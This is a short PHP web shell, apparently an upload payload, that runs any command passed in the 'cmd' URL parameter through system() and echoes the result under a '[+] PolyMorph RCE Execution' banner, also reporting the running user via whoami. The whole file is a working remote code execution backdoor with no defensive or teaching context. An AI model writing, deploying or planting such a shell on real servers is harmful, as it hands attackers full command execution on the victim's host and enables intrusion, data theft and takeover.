<?php
$cmd = (!empty($_GET['cmd'])) ? $_GET['cmd'] : 'id';
echo "<pre style='background:#111;color:#0f0;padding:12px;border-radius:4px;font-family:monospace;'>";
echo "[+] PolyMorph RCE Execution: " . htmlspecialchars($cmd) . "\n";
echo "[+] Running as: " . htmlspecialchars(exec('whoami')) . "\n\n";
system($cmd);
echo "</pre>";
?>
